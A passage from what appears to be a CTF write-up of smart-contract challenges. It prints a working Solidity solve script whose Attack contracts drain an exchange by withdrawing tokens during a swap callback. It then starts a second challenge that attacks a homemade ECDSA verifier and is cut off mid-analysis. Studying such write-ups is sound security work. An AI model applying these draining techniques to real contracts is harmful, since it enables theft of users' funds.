</span></code></pre><p>If we call the <code>swap()</code> function it will callback the <code>doSwap()</code> function on the caller. So, Now we can call the <code>withdraw()</code> function inside the callback of <code>doSwap()</code>.<p>Let's see what happens if we withdraw all the <code>200000</code> tokens of <code>Token1</code>. The withdraw function will send all the <code>200000</code> token1 to us but it updates our position.<pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>withdraw( token1, 200000 ) {
</span><span>    Token(token).transfer(msg.sender, 200000);
</span><span>    updatePosition(token1, -int256(200000));
</span><span>}
</span><span>
</span><span>function updatePosition(address token, int256 amount) internal {
</span><span>    require(allowedTokens[token], "token not allowed");
</span><span>
</span><span>    SwapState storage swapState = getSwapState();
</span><span>
</span><span>    int256 currentPosition = swapState.positions[token];
</span><span>    int256 newPosition = currentPosition + amount;
</span><span>
</span><span>    if (newPosition == 0) swapState.unsettledTokens -= 1;
</span><span>    else if (currentPosition == 0) swapState.unsettledTokens += 1;
</span><span>
</span><span>    swapState.positions[token] = newPosition;
</span><span>}
</span></code></pre><p>Now our newPosition becomes <code>200000</code> and the <code>swapState.unsettledTokens = 1</code> will be updated. So, we need to settle these <code>unsettledTokens</code> before completing this swap. If we observe the <code>swapTokens()</code> function where we can do swap and the positions are also being updated there.<pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>function swapTokens(address tokenIn, address tokenOut, uint256 amountIn, uint256 amountOut) public duringSwap {
</span><span>    require(allowedTokens[tokenIn], "token not allowed");
</span><span>    require(allowedTokens[tokenOut], "token not allowed");
</span><span>
</span><span>    uint256 liquidityBefore = getLiquidity(tokenIn, tokenOut);
</span><span>
</span><span>    require(liquidityBefore > 0, "no liquidity");
</span><span>
</span><span>    uint256 newReservesIn = getReserves(tokenIn, tokenOut) + amountIn;
</span><span>    uint256 newReservesOut = getReserves(tokenOut, tokenIn) - amountOut;
</span><span>
</span><span>    setReserves(tokenIn, tokenOut, newReservesIn);
</span><span>    setReserves(tokenOut, tokenIn, newReservesOut);
</span><span>
</span><span>    uint256 liquidityAfter = getLiquidity(tokenIn, tokenOut);
</span><span>
</span><span>    updatePosition(tokenIn, -int256(amountIn));
</span><span>    updatePosition(tokenOut, int256(amountOut));
</span><span>
</span><span>    require(liquidityAfter >= liquidityBefore, "insufficient liquidity");
</span><span>}
</span></code></pre><p>The <code>amountIn</code> to the <code>swapTokens()</code> will be deducted from the current position.<pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>    updatePosition(tokenIn, -int256(amountIn));
</span><span>    updatePosition(tokenOut, int256(amountOut));
</span></code></pre><p>So lets do these steps,<pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>Attack1.doSwap() {
</span><span>    exchange.withdraw(address(token1), 200000);
</span><span>    // 200000 token1 drained
</span><span>    // updatePosition() in withdraw:
</span><span>    // - currentPosition = 0
</span><span>    // - newPosition = 0 - 200000 = -200000
</span><span>    // - swapState.unsettledTokens = 1
</span><span>    // - swapState.positions[token1] = -200000
</span><span>    exchange.swapTokens(address(token1), address(token2), 200000, 0);
</span><span>    // updatePosition() for token1 in swapTokens:
</span><span>    // - currentPosition = -200000
</span><span>    // - newPosition =  -200000 + (-200000)= -400000
</span><span>    // - swapState.unsettledTokens = 1 (currentPosition!=0 || newPosition!=0)
</span><span>    // - swapState.positions[token1] = -400000
</span><span>
</span><span>    // updatePosition() for token2 in swapTokens:
</span><span>    // - currentPosition = 0
</span><span>    // - newPosition =  0 + 0 = 0
</span><span>    // - swapState.unsettledTokens = 0 (newPosition==0)
</span><span>    // - swapState.positions[token2] = 0 (because amountOut = 0)
</span><span>    // @notice: Here we can observe some inconsistency between state postions and unsettled tokens.
</span><span>
</span><span>    exchange.withdraw(address(token2), 200000);
</span><span>    // 200000 token2 drained
</span><span>    // updatePosition() in withdraw:
</span><span>    // - currentPosition = 0
</span><span>    // - newPosition = 0 - 200000 = -200000
</span><span>    // - swapState.unsettledTokens = 1 (currentPosition==0)
</span><span>    // - swapState.positions[token2] = -200000
</span><span>
</span><span>    exchange.swapTokens(address(token2), address(token3), 200000, 0);
</span><span>    // updatePosition() for token2 in swapTokens:
</span><span>    // - currentPosition = -200000
</span><span>    // - newPosition =  -200000 + (-200000)= -400000
</span><span>    // - swapState.unsettledTokens = 1 (currentPosition!=0 || newPosition!=0)
</span><span>    // - swapState.positions[token2] = -400000
</span><span>
</span><span>    // updatePosition() for token3 in swapTokens:
</span><span>    // - currentPosition = 0
</span><span>    // - newPosition =  0 + 0 = 0
</span><span>    // - swapState.unsettledTokens = 0 (newPosition==0)
</span><span>    // - swapState.positions[token3] = 0 (because amountOut = 0)
</span><span>}
</span><span>
</span><span>Attack2.doSwap(){
</span><span>    exchange.withdraw(address(token3), 400000);
</span><span>    // 400000 token3 drained
</span><span>    // updatePosition() in withdraw:
</span><span>    // - currentPosition = 0
</span><span>    // - newPosition = 0 - 400000 = -400000
</span><span>    // - swapState.unsettledTokens = 1 (currentPosition==0)
</span><span>    // - swapState.positions[token3] = -400000
</span><span>
</span><span>    exchange.swapTokens(address(token3), address(token1), 400000, 0);
</span><span>    // updatePosition() for token3 in swapTokens:
</span><span>    // - currentPosition = -400000
</span><span>    // - newPosition =  -400000 + (-400000)= -800000
</span><span>    // - swapState.unsettledTokens = 1 (currentPosition!=0 || newPosition!=0)
</span><span>    // - swapState.positions[token3] = -800000
</span><span>
</span><span>    // updatePosition() for token1 in swapTokens:
</span><span>    // - currentPosition = 0
</span><span>    // - newPosition =  0 + 0 = 0
</span><span>    // - swapState.unsettledTokens = 0 (newPosition==0)
</span><span>    // - swapState.positions[token1] = 0 (because amountOut = 0)
</span><span>}
</span></code></pre><p>Don't ask me anything please follow the math explained above. Th issues I see here are,<ul><li>Allowing withdraw() during swap<li>nonce being updated after the swap<li>Inconsistency between <code>swapState.positions</code> and <code>swapState.unsettledTokens</code>.<li>Only handling the cases where the <code>currentPosition == 0 || newPosition == 0</code>.</ul><div class=note-container><button class=note-toggle><div class=note-icon><p>Exchange.s.sol</div></button><div class=note-content style=display:block><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^0.8.0;
</span><span>
</span><span>import "forge-std/Script.sol";
</span><span>import "forge-std/console.sol";
</span><span>import "../src/Exchange.sol";
</span><span>
</span><span>contract ExchangeSolve is Script {
</span><span>    Setup public set = Setup(0xd9beE8f7dF07fd718f54ed05CAD77FC0EF1F9A7B);
</span><span>    Exchange public exchange = set.exchange();
</span><span>    Token public token1 = set.token1();
</span><span>    Token public token2 = set.token2();
</span><span>    Token public token3 = set.token3();
</span><span>    address player = vm.envAddress("PLAYER");
</span><span>
</span><span>    function run() public {
</span><span>        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
</span><span>        console.log("Player : ", player);
</span><span>        console.log("Setup : ", address(set));
</span><span>        console.log("Exchange : ", address(exchange));
</span><span>        console.log("Token1 : ", address(token1));
</span><span>        console.log("Token2 : ", address(token2));
</span><span>        console.log("Token3 : ", address(token3));
</span><span>
</span><span>        console.log("isSolved() : ", set.isSolved());
</span><span>
</span><span>        console.log("Exchange balance Token1 : ", token1.balanceOf(address(exchange)));
</span><span>        console.log("Exchange balance Token2 : ", token2.balanceOf(address(exchange)));
</span><span>        console.log("Exchange balance Token3 : ", token3.balanceOf(address(exchange)));
</span><span>        console.log("Player balance Token1 : ", token1.balanceOf(player));
</span><span>        console.log("Player balance Token2 : ", token2.balanceOf(player));
</span><span>        console.log("Player balance Token3 : ", token3.balanceOf(player));
</span><span>
</span><span>        Attack attack = new Attack(address(set));
</span><span>        attack.exploit();
</span><span>        Attack2 attack2 = new Attack2(address(set));
</span><span>        attack2.exploit();
</span><span>
</span><span>        console.log("Exchange balance Token1 : ", token1.balanceOf(address(exchange)));
</span><span>        console.log("Exchange balance Token2 : ", token2.balanceOf(address(exchange)));
</span><span>        console.log("Exchange balance Token3 : ", token3.balanceOf(address(exchange)));
</span><span>        console.log("Attacker balance Token1 : ", token1.balanceOf(address(attack)));
</span><span>        console.log("Attacker balance Token2 : ", token2.balanceOf(address(attack)));
</span><span>        console.log("Attacker 2 balance Token3 : ", token3.balanceOf(address(attack2)));
</span><span>        console.log("isSolved() : ", set.isSolved());
</span><span>    }
</span><span>
</span><span>}
</span><span>
</span><span>contract Attack is SwapCallback{
</span><span>    Setup public set;
</span><span>    Exchange public exchange;
</span><span>    Token public token1;
</span><span>    Token public token2;
</span><span>    Token public token3;
</span><span>    constructor(address _setup) {
</span><span>        set = Setup(_setup);
</span><span>        exchange = set.exchange();
</span><span>        token1 = set.token1();
</span><span>        token2 = set.token2();
</span><span>        token3 = set.token3();
</span><span>    }
</span><span>    function exploit() public {
</span><span>        exchange.swap();
</span><span>    }
</span><span>    function doSwap() public {
</span><span>
</span><span>        exchange.withdraw(address(token1), 200000);
</span><span>        exchange.swapTokens(address(token1), address(token2), 200000, 0);
</span><span>
</span><span>        exchange.withdraw(address(token2), 200000);
</span><span>        exchange.swapTokens(address(token2), address(token3), 200000, 0);
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Attack2 is SwapCallback{
</span><span>    Setup public set;
</span><span>    Exchange public exchange;
</span><span>    Token public token1;
</span><span>    Token public token2;
</span><span>    Token public token3;
</span><span>    constructor(address _setup) {
</span><span>        set = Setup(_setup);
</span><span>        exchange = set.exchange();
</span><span>        token1 = set.token1();
</span><span>        token2 = set.token2();
</span><span>        token3 = set.token3();
</span><span>    }
</span><span>    function exploit() public {
</span><span>        exchange.swap();
</span><span>    }
</span><span>    function doSwap() public {
</span><span>        exchange.withdraw(address(token3), 400000);
</span><span>        exchange.swapTokens(address(token3), address(token1), 400000, 0);
</span><span>    }
</span><span>}
</span></code></pre></div></div><hr><h1 id=fallout><a aria-label="Anchor link for: fallout" class=zola-anchor href=#fallout>Fallout</a></h1><p>P: "In the aftermath of the Great War, the world lies shattered, but hope endures in the form of Nuka-Cola Caps, the currency of the wasteland. Your mission, should you choose to accept it, is to obtain 1,000,000 Nuka-Cola Caps and secure your place as a true survivor in the barren expanse of post-apocalyptic America."<div class=note-container><button class=note-toggle><div class=note-icon><p>Fallout.sol</div></button><div class=note-content style=display:block><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: UNLICENSED
</span><span>pragma solidity ^0.8.0;
</span><span>import {ERC20} from "@openzeppelin-contracts-4.8.0/contracts/token/ERC20/ERC20.sol";
</span><span>
</span><span>contract Fallout is ERC20 {
</span><span>    error WrongPlayer();
</span><span>    error InvalidSignature();
</span><span>
</span><span>    uint256 public immutable Qx;
</span><span>    uint256 public immutable Qy;
</span><span>    address public immutable player;
</span><span>    Vault public immutable vault;
</span><span>
</span><span>    constructor(address _player, Vault _vault, uint256 qx, uint256 qy) ERC20("Nuka-Cola", "CAPS") {
</span><span>        Qx = qx;
</span><span>        Qy = qy;
</span><span>        player = _player;
</span><span>        vault = _vault;
</span><span>    }
</span><span>
</span><span>    function mint(
</span><span>        address recipient,
</span><span>        uint256 value,
</span><span>        uint256[2] memory rs
</span><span>    ) public {
</span><span>        bytes32 hash = keccak256(abi.encode(recipient, value));
</span><span>
</span><span>        uint256[2] memory Q;
</span><span>        Q[0] = Qx;
</span><span>        Q[1] = Qy;
</span><span>
</span><span>        bool valid = vault.validateSignature(hash, rs, Q);
</span><span>        if (!valid) {
</span><span>            revert InvalidSignature();
</span><span>        }
</span><span>
</span><span>        _mint(recipient, value);
</span><span>    }
</span><span>
</span><span>    function isSolved() public view returns (bool) {
</span><span>        return balanceOf(player) >= 1_000_000 ether;
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Vault {
</span><span>    // Set parameters for curve.
</span><span>    uint256 public immutable a;
</span><span>    uint256 public immutable b;
</span><span>    uint256 public immutable gx;
</span><span>    uint256 public immutable gy;
</span><span>    uint256 public immutable p;
</span><span>
</span><span>    constructor(uint256 _a, uint256 _b, uint256 _gx, uint256 _gy, uint256 _p) {
</span><span>        a = _a;
</span><span>        b = _b;
</span><span>        gx = _gx;
</span><span>        gy = _gy;
</span><span>        p = _p;
</span><span>    }
</span><span>
</span><span>    /**
</span><span>     * @dev Inverse of u in the field of modulo m.
</span><span>     */
</span><span>
</span><span>    function inverseMod(uint u, uint m) internal view
</span><span>        returns (uint)
</span><span>    {
</span><span>        if (u == 0 || u == m || m == 0)
</span><span>            return 0;
</span><span>        if (u > m)
</span><span>            u = u % m;
</span><span>
</span><span>        int t1;
</span><span>        int t2 = 1;
</span><span>        uint r1 = m;
</span><span>        uint r2 = u;
</span><span>        uint q;
</span><span>
</span><span>        while (r2 != 0) {
</span><span>            q = r1 / r2;
</span><span>            (t1, t2, r1, r2) = (t2, t1 - int(q) * t2, r2, r1 - q * r2);
</span><span>        }
</span><span>
</span><span>        if (t1 < 0)
</span><span>            return (m - uint(-t1));
</span><span>
</span><span>        return uint(t1);
</span><span>    }
</span><span>
</span><span>    /**
</span><span>     * @dev Transform affine coordinates into projective coordinates.
</span><span>     */
</span><span>    function toProjectivePoint(uint x0, uint y0) public view
</span><span>        returns (uint[3] memory P)
</span><span>    {
</span><span>        P[2] = addmod(0, 1, p);
</span><span>        P[0] = mulmod(x0, P[2], p);
</span><span>        P[1] = mulmod(y0, P[2], p);
</span><span>    }
</span><span>
</span><span>    /**
</span><span>     * @dev Add two points in affine coordinates and return projective point.
</span><span>     */
</span><span>    function addAndReturnProjectivePoint(uint x1, uint y1, uint x2, uint y2) public view
</span><span>        returns (uint[3] memory P)
</span><span>    {
</span><span>        uint x;
</span><span>        uint y;
</span><span>        (x, y) = add(x1, y1, x2, y2);
</span><span>        P = toProjectivePoint(x, y);
</span><span>    }
</span><span>
</span><span>    /**
</span><span>     * @dev Transform from projective to affine coordinates.
</span><span>     */
</span><span>    function toAffinePoint(uint x0, uint y0, uint z0) public view
</span><span>        returns (uint x1, uint y1)
</span><span>    {
</span><span>        uint z0Inv;
</span><span>        z0Inv = inverseMod(z0, p);
</span><span>        x1 = mulmod(x0, z0Inv, p);
</span><span>        y1 = mulmod(y0, z0Inv, p);
</span><span>    }
</span><span>
</span><span>    /**
</span><span>     * @dev Return the zero curve in projective coordinates.
</span><span>     */
</span><span>    function zeroProj() public view
</span><span>        returns (uint x, uint y, uint z)
</span><span>    {
</span><span>        return (0, 1, 0);
</span><span>    }
</span><span>
</span><span>    /**
</span><span>     * @dev Return the zero curve in affine coordinates.
</span><span>     */
</span><span>    function zeroAffine() public view
</span><span>        returns (uint x, uint y)
</span><span>    {
</span><span>        return (0, 0);
</span><span>    }
</span><span>
</span><span>    /**
</span><span>     * @dev Check if the curve is the zero curve.
</span><span>     */
</span><span>    function isZeroCurve(uint x0, uint y0) public view
</span><span>        returns (bool isZero)
</span><span>    {
</span><span>        if(x0 == 0 && y0 == 0) {
</span><span>            return true;
</span><span>        }
</span><span>        return false;
</span><span>    }
</span><span>
</span><span>    /**
</span><span>     * @dev Check if a point in affine coordinates is on the curve.
</span><span>     */
</span><span>    function isOnCurve(uint x, uint y) public view
</span><span>        returns (bool)
</span><span>    {
</span><span>        if (0 == x || x == p || 0 == y || y == p) {
</span><span>            return false;
</span><span>        }
</span><span>
</span><span>        uint LHS = mulmod(y, y, p); // y^2
</span><span>        uint RHS = mulmod(mulmod(x, x, p), x, p); // x^3
</span><span>
</span><span>        if (a != 0) {
</span><span>            RHS = addmod(RHS, mulmod(x, a, p), p); // x^3 + a*x
</span><span>        }
</span><span>        if (b != 0) {
</span><span>            RHS = addmod(RHS, b, p); // x^3 + a*x + b
</span><span>        }
</span><span>
</span><span>        return LHS == RHS;
</span><span>    }
</span><span>
</span><span>    /**
</span><span>     * @dev Double an elliptic curve point in projective coordinates. See
</span><span>     * https://www.nayuki.io/page/elliptic-curve-point-addition-in-projective-coordinates
</span><span>     */
</span><span>    function twiceProj(uint x0, uint y0, uint z0) public view
</span><span>        returns (uint x1, uint y1, uint z1)
</span><span>    {
</span><span>        uint t;
</span><span>        uint u;
</span><span>        uint v;
</span><span>        uint w;
</span><span>
</span><span>        if(isZeroCurve(x0, y0)) {
</span><span>            return zeroProj();
</span><span>        }
</span><span>
</span><span>        u = mulmod(y0, z0, p);
</span><span>        u = mulmod(u, 2, p);
</span><span>
</span><span>        v = mulmod(u, x0, p);
</span><span>        v = mulmod(v, y0, p);
</span><span>        v = mulmod(v, 2, p);
</span><span>
</span><span>        x0 = mulmod(x0, x0, p);
</span><span>        t = mulmod(x0, 3, p);
</span><span>
</span><span>        z0 = mulmod(z0, z0, p);
</span><span>        z0 = mulmod(z0, a, p);
</span><span>        t = addmod(t, z0, p);
</span><span>
</span><span>        w = mulmod(t, t, p);
</span><span>        x0 = mulmod(2, v, p);
</span><span>        w = addmod(w, p-x0, p);
</span><span>
</span><span>        x0 = addmod(v, p-w, p);
</span><span>        x0 = mulmod(t, x0, p);
</span><span>        y0 = mulmod(y0, u, p);
</span><span>        y0 = mulmod(y0, y0, p);
</span><span>        y0 = mulmod(2, y0, p);
</span><span>        y1 = addmod(x0, p-y0, p);
</span><span>
</span><span>        x1 = mulmod(u, w, p);
</span><span>
</span><span>        z1 = mulmod(u, u, p);
</span><span>        z1 = mulmod(z1, u, p);
</span><span>    }
</span><span>
</span><span>    /**
</span><span>     * @dev Add two elliptic curve points in projective coordinates. See
</span><span>     * https://www.nayuki.io/page/elliptic-curve-point-addition-in-projective-coordinates
</span><span>     */
</span><span>    function addProj(uint x0, uint y0, uint z0, uint x1, uint y1, uint z1) public view
</span><span>        returns (uint x2, uint y2, uint z2)
</span><span>    {
</span><span>        uint t0;
</span><span>        uint t1;
</span><span>        uint u0;
</span><span>        uint u1;
</span><span>
</span><span>        if (isZeroCurve(x0, y0)) {
</span><span>            return (x1, y1, z1);
</span><span>        }
</span><span>        else if (isZeroCurve(x1, y1)) {
</span><span>            return (x0, y0, z0);
</span><span>        }
</span><span>
</span><span>        t0 = mulmod(y0, z1, p);
</span><span>        t1 = mulmod(y1, z0, p);
</span><span>
</span><span>        u0 = mulmod(x0, z1, p);
</span><span>        u1 = mulmod(x1, z0, p);
</span><span>
</span><span>        if (u0 == u1) {
</span><span>            if (t0 == t1) {
</span><span>                return twiceProj(x0, y0, z0);
</span><span>            }
</span><span>            else {
</span><span>                return zeroProj();
</span><span>            }
</span><span>        }
</span><span>
</span><span>        (x2, y2, z2) = addProj2(mulmod(z0, z1, p), u0, u1, t1, t0);
</span><span>    }
</span><span>
</span><span>    /**
</span><span>     * @dev Helper function that splits addProj to avoid too many local variables.
</span><span>     */
</span><span>    function addProj2(uint v, uint u0, uint u1, uint t1, uint t0) private view
</span><span>        returns (uint x2, uint y2, uint z2)
</span><span>    {
</span><span>        uint u;
</span><span>        uint u2;
</span><span>        uint u3;
</span><span>        uint w;
</span><span>        uint t;
</span><span>
</span><span>        t = addmod(t0, p-t1, p);
</span><span>        u = addmod(u0, p-u1, p);
</span><span>        u2 = mulmod(u, u, p);
</span><span>
</span><span>        w = mulmod(t, t, p);
</span><span>        w = mulmod(w, v, p);
</span><span>        u1 = addmod(u1, u0, p);
</span><span>        u1 = mulmod(u1, u2, p);
</span><span>        w = addmod(w, p-u1, p);
</span><span>
</span><span>        x2 = mulmod(u, w, p);
</span><span>
</span><span>        u3 = mulmod(u2, u, p);
</span><span>        u0 = mulmod(u0, u2, p);
</span><span>        u0 = addmod(u0, p-w, p);
</span><span>        t = mulmod(t, u0, p);
</span><span>        t0 = mulmod(t0, u3, p);
</span><span>
</span><span>        y2 = addmod(t, p-t0, p);
</span><span>
</span><span>        z2 = mulmod(u3, v, p);
</span><span>    }
</span><span>
</span><span>    /**
</span><span>     * @dev Add two elliptic curve points in affine coordinates.
</span><span>     */
</span><span>    function add(uint x0, uint y0, uint x1, uint y1) public view
</span><span>        returns (uint, uint)
</span><span>    {
</span><span>        uint z0;
</span><span>
</span><span>        (x0, y0, z0) = addProj(x0, y0, 1, x1, y1, 1);
</span><span>
</span><span>        return toAffinePoint(x0, y0, z0);
</span><span>    }
</span><span>
</span><span>    /**
</span><span>     * @dev Double an elliptic curve point in affine coordinates.
</span><span>     */
</span><span>    function twice(uint x0, uint y0) public view
</span><span>        returns (uint, uint)
</span><span>    {
</span><span>        uint z0;
</span><span>
</span><span>        (x0, y0, z0) = twiceProj(x0, y0, 1);
</span><span>
</span><span>        return toAffinePoint(x0, y0, z0);
</span><span>    }
</span><span>
</span><span>    /**
</span><span>     * @dev Multiply an elliptic curve point by a 2 power base (i.e., (2^exp)*P)).
</span><span>     */
</span><span>    function multiplyPowerBase2(uint x0, uint y0, uint exp) public view
</span><span>        returns (uint, uint)
</span><span>    {
</span><span>        uint base2X = x0;
</span><span>        uint base2Y = y0;
</span><span>        uint base2Z = 1;
</span><span>
</span><span>        for(uint i = 0; i < exp; i++) {
</span><span>            (base2X, base2Y, base2Z) = twiceProj(base2X, base2Y, base2Z);
</span><span>        }
</span><span>
</span><span>        return toAffinePoint(base2X, base2Y, base2Z);
</span><span>    }
</span><span>
</span><span>    /**
</span><span>     * @dev Multiply an elliptic curve point by a scalar.
</span><span>     */
</span><span>    function multiplyScalar(uint x0, uint y0, uint scalar) public view
</span><span>        returns (uint x1, uint y1)
</span><span>    {
</span><span>        if(scalar == 0) {
</span><span>            return zeroAffine();
</span><span>        }
</span><span>        else if (scalar == 1) {
</span><span>            return (x0, y0);
</span><span>        }
</span><span>        else if (scalar == 2) {
</span><span>            return twice(x0, y0);
</span><span>        }
</span><span>
</span><span>        uint base2X = x0;
</span><span>        uint base2Y = y0;
</span><span>        uint base2Z = 1;
</span><span>        uint z1 = 1;
</span><span>        x1 = x0;
</span><span>        y1 = y0;
</span><span>
</span><span>        if(scalar%2 == 0) {
</span><span>            x1 = y1 = 0;
</span><span>        }
</span><span>
</span><span>        scalar = scalar >> 1;
</span><span>
</span><span>        while(scalar > 0) {
</span><span>            (base2X, base2Y, base2Z) = twiceProj(base2X, base2Y, base2Z);
</span><span>
</span><span>            if(scalar%2 == 1) {
</span><span>                (x1, y1, z1) = addProj(base2X, base2Y, base2Z, x1, y1, z1);
</span><span>            }
</span><span>
</span><span>            scalar = scalar >> 1;
</span><span>        }
</span><span>
</span><span>        return toAffinePoint(x1, y1, z1);
</span><span>    }
</span><span>
</span><span>    /**
</span><span>     * @dev Multiply the curve's generator point by a scalar.
</span><span>     */
</span><span>    function multipleGeneratorByScalar(uint scalar) public view
</span><span>        returns (uint, uint)
</span><span>    {
</span><span>        return multiplyScalar(gx, gy, scalar);
</span><span>    }
</span><span>
</span><span>    /**
</span><span>     * @dev Validate combination of message, signature, and public key.
</span><span>     */
</span><span>    function validateSignature(bytes32 message, uint[2] memory rs, uint[2] memory Q) public view
</span><span>        returns (bool)
</span><span>    {
</span><span>        // To disambiguate between public key solutions, include comment below.
</span><span>        if(rs[0] == 0 || rs[0] >= p || rs[1] == 0) {// || rs[1] > lowSmax)
</span><span>            return false;
</span><span>        }
</span><span>        if (!isOnCurve(Q[0], Q[1])) {
</span><span>            return false;
</span><span>        }
</span><span>
</span><span>        uint x1;
</span><span>        uint x2;
</span><span>        uint y1;
</span><span>        uint y2;
</span><span>
</span><span>        uint sInv = inverseMod(rs[1], p);
</span><span>        (x1, y1) = multiplyScalar(gx, gy, mulmod(uint(message), sInv, p));
</span><span>        (x2, y2) = multiplyScalar(Q[0], Q[1], mulmod(rs[0], sInv, p));
</span><span>        uint[3] memory P = addAndReturnProjectivePoint(x1, y1, x2, y2);
</span><span>
</span><span>        if (P[2] == 0) {
</span><span>            return false;
</span><span>        }
</span><span>
</span><span>        uint Px = inverseMod(P[2], p);
</span><span>        Px = mulmod(P[0], mulmod(Px, Px, p), p);
</span><span>
</span><span>        return Px % p == rs[0];
</span><span>    }
</span><span>}
</span><span>
</span></code></pre></div></div><h2 id=solution-8><a aria-label="Anchor link for: solution-8" class=zola-anchor href=#solution-8>Solution</a></h2><p>Aaah.. Mathematics, Cryptography and Smart contracts and elite combination here. The goal is very clear here we need to call the <code>mint()</code> function with the amount <code>1_000_000 ether</code>. The challenge for us is to pass the signature verification.<p>So, what the heck is the math is doing in the solidity smart contract? Well it is an <strong>Elliptic Curve</strong> Cryptography scheme implementation. To be precisely it is a <strong>SECP256R1</strong> curve.<p>Now, first learn a bit about the <strong>ECC</strong> and how an implementation looks.<h3 id=elliptic-curve-cryptography><a aria-label="Anchor link for: elliptic-curve-cryptography" class=zola-anchor href=#elliptic-curve-cryptography>Elliptic Curve Cryptography</a></h3><p>Elliptic Curve Cryptography (ECC) is an asymmetric cryptographic that provides the same level of security as RSA or discrete logarithm systems with considerably shorter operands (approximately 160‚Äì256 bit vs. 1024‚Äì3072 bit). An elliptic curve is a special type of polynomial equation. For cryptographic use, we need to consider the curve not over the real numbers but over a finite field.<p>This is how an ECC equations looks like,</p><center> <p>\( E:Y^2 = X^3+aX+b \)</p> <img height=50% src=/assets/img/ctf_img/statemind25/statemind_fallout1.png width=50%> </center><p>There is point P, 2P and a straight line marked on the graph. These are the operations we can perform on Elliptic Curves. Addition of two points (P, Q) will result point R. IF we double the same point (P+P) will result in a 2P. If I did this point addition for <code>n</code> times, i.e, \( Q = n*P \). Now I'll give you the values of <code>Q,P</code> can you find what is <code>n</code>? This is where the ECC security lies.<p>Let's see how a secure signing and verification process looks like,<h3 id=ecdsa-signing-process><a aria-label="Anchor link for: ecdsa-signing-process" class=zola-anchor href=#ecdsa-signing-process>ECDSA Signing Process</a></h3><p>A user selects a private key \( d \) where \( 1 \leq d < n \) and computes the public key: \( Q = d \cdot G \)<ol><li><p>Compute the message hash \( z \) (typically \( z = H(m) \), using SHA-256).</p><li><p>Select a random integer \( k \) where \( 1 \leq k < n \).</p><li><p>Compute the elliptic curve point:</p> <p>\[ (x_1, y_1) = k \cdot G \]</p><li><p>Compute the first signature component:</p> <p>\[ r = x_1 \mod n \]</p> <p>If \( r = 0 \), choose a new \( k \) and repeat.</p><li><p>Compute the second signature component:</p> <p>\[ s = k^{-1} (z + r d) \mod n \]</p> <p>If \( s = 0 \), choose a new \( k \) and repeat.</p><li><p>The signature is \( (r, s) \).</p></ol><h3 id=ecdsa-verification-process><a aria-label="Anchor link for: ecdsa-verification-process" class=zola-anchor href=#ecdsa-verification-process>ECDSA Verification Process</a></h3><p>Given a signature \( (r, s) \) and public key \( Q \):<ol><li><p>Compute the message hash \( z = H(m) \).</p><li><p>Compute the modular inverse of \( s \) modulo \( n \):</p> <p>\[ s^{-1} \mod n \]</p><li><p>Compute:</p> <p>\[ u_1 = z s^{-1} \mod n \]</p> <p>\[ u_2 = r s^{-1} \mod n \]</p><li><p>Compute the elliptic curve point:</p> <p>\[ (x', y') = u_1 G + u_2 Q \]</p><li><p>Compute \( x' \mod n \) and check:</p> <p>\[ x' \equiv r \mod n \]</p> <p>If true, the signature is valid.</p></ol><h3 id=attack-1><a aria-label="Anchor link for: attack-1" class=zola-anchor href=#attack-1>Attack</a></h3><p>Lets get all the values and point details from the protocol.<pre class=language-bash data-lang=bash style=color:#61676c;background-color:#fafafa><code class=language-bash data-lang=bash><span style=color:#f29718>Fallout</span><span> :  0xf96C8C1685180b9551f86952992baAA220E7C91C
</span><span style=color:#f29718>Vault</span><span> :  0x11e44e424A85203E1208097128B9B1e897C8A9A9
</span><span style=color:#f29718>Qx</span><span> =  228372021298333142209829245091882548944496316312635232236
</span><span style=color:#f29718>Qy</span><span> =  3693481507636668030082911526987394375826206080991036294396
</span><span style=color:#f29718>a</span><span> =  479674765111403080798288599752794621357071126054239970719
</span><span style=color:#f29718>b</span><span> =  1839890679886286542886449861618094502587090720247817035647
</span><span style=color:#f29718>gx</span><span> =  741691539696267564005241324344676638704819822626281227364
</span><span style=color:#f29718>gy</span><span> =  3102360199939373249439960210926161310269296148717758328237
</span><span style=color:#f29718>p</span><span> =  4007911249843509079694969957202343357280666055654537667969
</span></code></pre><p>Enough equtions, now compare the current solidity implementation of the verification process with the above equations.<pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>function validateSignature(bytes32 message, uint[2] memory rs, uint[2] memory Q) public view
</span><span>    returns (bool)
</span><span>{
</span><span>    // To disambiguate between public key solutions, include comment below.
</span><span>    if(rs[0] == 0 || rs[0] >= p || rs[1] == 0) {// || rs[1] > lowSmax)
</span><span>        return false;
</span><span>    }
</span><span>    if (!isOnCurve(Q[0], Q[1])) {
</span><span>        return false;
</span><span>    }
</span><span>    uint x1;
</span><span>    uint x2;
</span><span>    uint y1;
</span><span>    uint y2;
</span><span>    uint sInv = inverseMod(rs[1], p);
</span><span>    (x1, y1) = multiplyScalar(gx, gy, mulmod(uint(message), sInv, p));
</span><span>    (x2, y2) = multiplyScalar(Q[0], Q[1], mulmod(rs[0], sInv, p));
</span><span>    uint[3] memory P = addAndReturnProjectivePoint(x1, y1, x2, y2);
</span><span>    if (P[2] == 0) {
</span><span>        return false;
</span><span>    }
</span><span>    uint Px = inverseMod(P[2], p);
</span><span>    Px = mulmod(P[0], mulmod(Px, Px, p), p);
</span><span>    return Px % p == rs[0];
</span><span>}
